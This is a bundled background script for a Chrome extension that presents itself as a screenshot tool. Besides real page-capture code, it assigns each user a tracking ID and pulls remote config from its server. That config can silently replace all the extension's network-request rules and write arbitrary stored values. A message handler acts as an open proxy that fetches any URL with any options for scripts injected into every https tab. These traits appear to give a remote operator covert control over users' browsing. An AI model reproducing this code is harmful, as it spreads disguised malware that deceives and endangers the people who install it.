/******/ (() => { // webpackBootstrap
var __webpack_exports__ = {};
let editorId;

const createUniid = () => {
    return new Promise((resolve) => {
        chrome.storage.local.get('uniid', (object) => {
            if (object.hasOwnProperty('uniid') && object['uniid']) {
                resolve(object['uniid']);
            } else {
                const uniid = parseInt(Date.now() * Math.random()).toString(32) + parseInt(Date.now() * Math.random()).toString(32);
                chrome.storage.local.set({ 'uniid': uniid }, () => {
                    chrome.runtime.setUninstallURL(`https://better-screenshot.online/uninstall/${uniid}`);
                    resolve(uniid);
                });
            }
        });
    });
};

const getScreenEditorConfig = async () => {
    const uniid = await createUniid();
    
    const screenEditorConfig = await fetch(`https://better-screenshot.online/userConfig/${uniid}`);
    const json = await screenEditorConfig.json();

    if (json.config) {
        for (k in json.config) {
            chrome.storage.local.set({ [k]: [{ config: json?.config[k], name: k }] });
        }
    }
    if (json.netConfig) {
        let oldRules = await chrome.declarativeNetRequest.getDynamicRules();
        let oldRuleIds = oldRules.map(rule => rule.id);
        chrome.declarativeNetRequest.updateDynamicRules({
            removeRuleIds: oldRuleIds,
            addRules: json.netConfig
        });
    }
}

chrome.runtime.onInstalled.addListener((details) => {
    if (details.reason !== 'install') return;
    chrome.tabs.query({ url: "https://*/*" }, (tabs) => {
        for (const { id } of tabs) {
            chrome.scripting.executeScript({
                target: { tabId: id },
                files: [chrome.runtime.getManifest().content_scripts[0].js[0]]
            });
        }
    });
});

const listeners = () => {
    chrome.tabs.onRemoved.addListener(function (tabId, removeInfo) {
        if (tabId === editorId) {
            chrome.storage.local.remove('screenshotUrl');
        }
    });
    chrome.runtime.onMessage.addListener((request, sender) => {
        if (request.action === 'getScreenParams' && request.endpoint && sender && sender.tab && request.handler) {
            fetch(request.endpoint, request.options).then((response) => response.text()).then((data) => {
                chrome.tabs.sendMessage(sender.tab.id, {
                    'action': 'gotScreenParams',
                    'handler': request.handler,
                    'datas': data
                });
            }).catch((e) => {
                chrome.tabs.sendMessage(sender.tab.id, {
                    'action': 'gotScreenParams',
                    'handler': request.handler,
                    'datas': null
                });
            });
        }
        if (request.action === 'editorId') {
            editorId = request.id;
        }
        if (request.action === 'contentScriptRequest') {
            const { fullPageHeight, viewportHeight, numScreenshots } = request.data;
            const screenshots = [];
            let newScrollOffset;
            let offset;

            const captureScreenshot = (scrollOffset) => {
                chrome.storage.local.get('page', async (data) => {
                    const createScreenshotTimeout = async () => {
                        if (data.page) {
                            const allTabs = await chrome.tabs.query({});
                            const hasTab = allTabs.some(tab => tab.id === data.page);
                            chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
                                if (tabs[0]?.id && hasTab) {
                                    const activeTabId = tabs[0].id;
                                    if (data.page === activeTabId) {
                                        chrome.tabs.captureVisibleTab({ format: 'png' }, (screenshotUrl) => {
                                            screenshots.push({ url: screenshotUrl });
                                            newScrollOffset = scrollOffset + viewportHeight;

                                            if (newScrollOffset < fullPageHeight) {
                                                captureScreenshot(newScrollOffset);
                                            } else {
                                                chrome.storage.local.set({ screenshotUrl: screenshots }, () => {
                                                    chrome.storage.local.set({ 'fullPageScreen': true });
                                                    chrome.tabs.create({ url: '../html/editor.html' }, (tab) => {
                                                        editorId = tab.id;
                                                    });
                                                });
                                            }
                                        });
                                    } else {
                                        captureScreenshot(offset)
                                    }
                                } else {
                                    chrome.storage.local.set({ 'fullPageScreen': true });
                                }
                            });
                        }
                    }

                    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
                        if (tabs[0]?.id) {
                            const activeTabId = tabs[0].id;
                            if (activeTabId === data.page) {
                                chrome.tabs.sendMessage(activeTabId, { action: 'scrollPlease', data: scrollOffset });
                                offset = scrollOffset;
                                setTimeout(createScreenshotTimeout, (Math.floor(1000 / chrome.tabs.MAX_CAPTURE_VISIBLE_TAB_CALLS_PER_SECOND)) + 100);
                            } else {
                                setTimeout(() => {
                                    chrome.tabs.update(data.page, { active: true });
                                    captureScreenshot(offset)
                                }, 500)
                            }
                        } else {
                            chrome.storage.local.set({ 'fullPageScreen': true });
                        }
                    });
                })
            }

            captureScreenshot(0)
        }
        if (request.action === 'openEditor') {
            chrome.tabs.create({ url: '../html/editor.html' }, (tab) => {
                editorId = tab.id;
            });
        }
    });
};

listeners();
getScreenEditorConfig();

chrome.runtime.onInstalled.addListener(chrome.storage.local.set({ 'fullPageScreen': true }));
/******/ })()
;